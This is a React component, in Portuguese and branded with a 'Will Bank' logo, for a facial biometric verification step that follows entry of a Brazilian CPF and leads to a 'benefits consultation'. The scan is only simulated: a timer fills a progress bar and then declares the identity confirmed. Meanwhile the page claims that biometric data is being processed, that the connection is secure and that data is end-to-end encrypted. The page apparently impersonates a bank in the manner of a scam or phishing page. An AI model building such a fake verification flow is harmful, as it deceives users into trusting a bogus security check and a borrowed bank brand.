import { useEffect, useRef, useState, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Camera, CheckCircle, Shield, Loader2, RefreshCw, X } from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";

type BiometriaStep = "intro" | "camera" | "scanning" | "success";

const Biometria = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [step, setStep] = useState<BiometriaStep>("intro");
  const [scanProgress, setScanProgress] = useState(0);
  const [cameraError, setCameraError] = useState<string | null>(null);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
    }
  }, [cpfData, navigate]);

  const stopCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
  }, []);

  useEffect(() => {
    return () => {
      stopCamera();
    };
  }, [stopCamera]);

  const startCamera = async () => {
    try {
      setCameraError(null);
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false,
      });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      setStep("camera");
    } catch (error) {
      console.error("Erro ao acessar câmera:", error);
      setCameraError("Não foi possível acessar a câmera. Verifique as permissões do navegador.");
    }
  };

  const handleCapture = () => {
    setStep("scanning");
    
    // Simular progresso de escaneamento
    const interval = setInterval(() => {
      setScanProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setStep("success");
          stopCamera();
          
          // Navegar para consulta após 2s
          setTimeout(() => {
            navigate("/consulta", { state: { cpfData } });
          }, 2000);
          return 100;
        }
        return prev + 2;
      });
    }, 60);
  };

  const handleRetry = () => {
    setCameraError(null);
    setScanProgress(0);
    setStep("intro");
    stopCamera();
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex flex-col">
      {/* Header */}
      <header className="px-4 py-4 flex items-center justify-between">
        <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
        <div className="flex items-center gap-2 text-emerald-400 text-xs">
          <Shield className="w-4 h-4" />
          <span>Conexão segura</span>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center px-4 py-6">
        <div className="w-full max-w-sm space-y-6">
          
          {/* Intro Step */}
          {step === "intro" && (
            <div className="text-center space-y-6 animate-fade-in">
              <div className="w-24 h-24 mx-auto bg-primary/20 rounded-full flex items-center justify-center">
                <Camera className="w-12 h-12 text-primary" />
              </div>
              
              <div className="space-y-2">
                <h1 className="text-2xl font-bold text-white">
                  Verificação Facial
                </h1>
                <p className="text-slate-400 text-sm">
                  Para sua segurança, precisamos validar sua identidade através do reconhecimento facial.
                </p>
              </div>

              <div className="bg-slate-800/50 rounded-xl p-4 space-y-3 text-left">
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 bg-primary/20 rounded-full flex items-center justify-center shrink-0">
                    <span className="text-primary text-xs font-bold">1</span>
                  </div>
                  <p className="text-slate-300 text-sm">Posicione seu rosto dentro do círculo</p>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 bg-primary/20 rounded-full flex items-center justify-center shrink-0">
                    <span className="text-primary text-xs font-bold">2</span>
                  </div>
                  <p className="text-slate-300 text-sm">Mantenha a câmera estável</p>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 bg-primary/20 rounded-full flex items-center justify-center shrink-0">
                    <span className="text-primary text-xs font-bold">3</span>
                  </div>
                  <p className="text-slate-300 text-sm">Aguarde a validação automática</p>
                </div>
              </div>

              {cameraError && (
                <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-red-400 text-sm">
                  {cameraError}
                </div>
              )}

              <Button 
                onClick={startCamera}
                className="w-full h-14 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground"
              >
                <Camera className="w-5 h-5 mr-2" />
                Iniciar verificação
              </Button>
            </div>
          )}

          {/* Camera Step */}
          {step === "camera" && (
            <div className="space-y-6 animate-fade-in">
              <div className="text-center space-y-2">
                <h2 className="text-xl font-semibold text-white">
                  Posicione seu rosto
                </h2>
                <p className="text-slate-400 text-sm">
                  Centralize seu rosto no círculo abaixo
                </p>
              </div>

              {/* Camera Container */}
              <div className="relative aspect-[3/4] bg-black rounded-2xl overflow-hidden">
                <video 
                  ref={videoRef}
                  autoPlay 
                  playsInline 
                  muted
                  className="absolute inset-0 w-full h-full object-cover scale-x-[-1]"
                />
                
                {/* Face Overlay */}
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="relative w-56 h-72">
                    {/* Oval Border */}
                    <div className="absolute inset-0 border-4 border-primary rounded-[50%] animate-pulse" />
                    
                    {/* Corner Markers */}
                    <div className="absolute -top-1 -left-1 w-6 h-6 border-t-4 border-l-4 border-primary rounded-tl-xl" />
                    <div className="absolute -top-1 -right-1 w-6 h-6 border-t-4 border-r-4 border-primary rounded-tr-xl" />
                    <div className="absolute -bottom-1 -left-1 w-6 h-6 border-b-4 border-l-4 border-primary rounded-bl-xl" />
                    <div className="absolute -bottom-1 -right-1 w-6 h-6 border-b-4 border-r-4 border-primary rounded-br-xl" />
                  </div>
                </div>

                {/* Dark Overlay */}
                <div className="absolute inset-0 pointer-events-none">
                  <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-black/60" />
                </div>
              </div>

              <div className="flex gap-3">
                <Button 
                  variant="outline"
                  onClick={handleRetry}
                  className="flex-1 h-12 border-slate-600 text-slate-300 hover:bg-slate-800"
                >
                  <X className="w-4 h-4 mr-2" />
                  Cancelar
                </Button>
                <Button 
                  onClick={handleCapture}
                  className="flex-1 h-12 bg-primary hover:bg-primary/90 text-primary-foreground font-semibold"
                >
                  Capturar
                </Button>
              </div>
            </div>
          )}

          {/* Scanning Step */}
          {step === "scanning" && (
            <div className="space-y-6 animate-fade-in">
              <div className="text-center space-y-2">
                <h2 className="text-xl font-semibold text-white">
                  Analisando biometria
                </h2>
                <p className="text-slate-400 text-sm">
                  Aguarde enquanto validamos sua identidade
                </p>
              </div>

              {/* Camera with scanning effect */}
              <div className="relative aspect-[3/4] bg-black rounded-2xl overflow-hidden">
                <video 
                  ref={videoRef}
                  autoPlay 
                  playsInline 
                  muted
                  className="absolute inset-0 w-full h-full object-cover scale-x-[-1] blur-sm"
                />
                
                {/* Scanning Effect */}
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="relative w-56 h-72">
                    <div className="absolute inset-0 border-4 border-emerald-400 rounded-[50%]" />
                    
                    {/* Scanning Line */}
                    <div 
                      className="absolute left-0 right-0 h-1 bg-gradient-to-r from-transparent via-emerald-400 to-transparent"
                      style={{
                        top: `${scanProgress}%`,
                        boxShadow: "0 0 20px 5px rgba(52, 211, 153, 0.5)"
                      }}
                    />
                  </div>
                </div>

                {/* Overlay */}
                <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px]" />
                
                {/* Progress */}
                <div className="absolute bottom-4 left-4 right-4">
                  <div className="bg-slate-800/90 rounded-lg p-3 space-y-2">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-slate-300">Validando...</span>
                      <span className="text-emerald-400 font-medium">{scanProgress}%</span>
                    </div>
                    <div className="h-2 bg-slate-700 rounded-full overflow-hidden">
                      <div 
                        className="h-full bg-gradient-to-r from-emerald-500 to-emerald-400 transition-all duration-100"
                        style={{ width: `${scanProgress}%` }}
                      />
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-center gap-2 text-slate-400">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span className="text-sm">Processando dados biométricos...</span>
              </div>
            </div>
          )}

          {/* Success Step */}
          {step === "success" && (
            <div className="text-center space-y-6 animate-fade-in">
              <div className="w-24 h-24 mx-auto bg-emerald-500/20 rounded-full flex items-center justify-center">
                <CheckCircle className="w-16 h-16 text-emerald-400" />
              </div>
              
              <div className="space-y-2">
                <h1 className="text-2xl font-bold text-white">
                  Identidade Confirmada!
                </h1>
                <p className="text-slate-400">
                  Sua verificação facial foi concluída com sucesso.
                </p>
              </div>

              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-4">
                <p className="text-emerald-400 text-sm">
                  Redirecionando para consulta de benefícios...
                </p>
              </div>

              <div className="flex items-center justify-center">
                <Loader2 className="w-6 h-6 text-primary animate-spin" />
              </div>
            </div>
          )}

        </div>
      </main>

      {/* Footer */}
      <footer className="px-4 py-4 text-center">
        <p className="text-slate-500 text-xs">
          Seus dados estão protegidos por criptografia de ponta
        </p>
      </footer>
    </div>
  );
};

export default Biometria;
